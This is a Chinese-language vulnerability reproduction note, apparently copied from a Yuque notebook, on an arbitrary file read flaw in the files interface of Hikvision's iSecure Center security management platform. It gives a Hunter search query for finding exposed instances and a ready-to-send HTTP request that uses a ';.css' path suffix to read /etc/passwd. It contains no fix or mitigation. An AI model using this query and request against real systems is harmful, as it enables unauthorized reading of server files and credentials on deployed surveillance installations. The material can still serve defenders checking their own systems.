# 海康威视iSecure Center 综合安防管理平台files 接口存在任意文件读取漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。海康威视iSecure Center 综合安防管理平台files 接口存在任意文件读取漏洞，攻击者可通过该漏洞读取服务器上任意文件，获取敏感信息。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ <font style="color:rgb(0, 0, 0);">HIKVISION iSecure Center综合安防管理平台</font>

# <font style="color:rgb(0, 0, 0);">三、</font><font style="color:rgb(0, 0, 0);">资产测绘</font>
**hunter查询语法：**

`<font style="color:rgb(0, 0, 0);">app.name=="Hikvision 海康威视 iSecure Center"</font>`

![1691858054561-aa88559b-46e0-4837-ae4c-6f3e9e3982c5.png](./img/OAqEWr4K1U6jmvTP/1691858054561-aa88559b-46e0-4837-ae4c-6f3e9e3982c5-092169.png)

+ <font style="color:rgb(0, 0, 0);">登录页面</font>

![1691858046745-db2cadc6-9bde-4037-952f-2faf2537b85f.png](./img/OAqEWr4K1U6jmvTP/1691858046745-db2cadc6-9bde-4037-952f-2faf2537b85f-321706.png)

# <font style="color:rgb(0, 0, 0);">四、漏洞复现</font>
```plain
GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate, br
```

![1701837056180-c3c2c99a-7025-482f-a16a-a184ea9b0619.png](./img/OAqEWr4K1U6jmvTP/1701837056180-c3c2c99a-7025-482f-a16a-a184ea9b0619-784391.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/unwcbu4dxgpzlizn>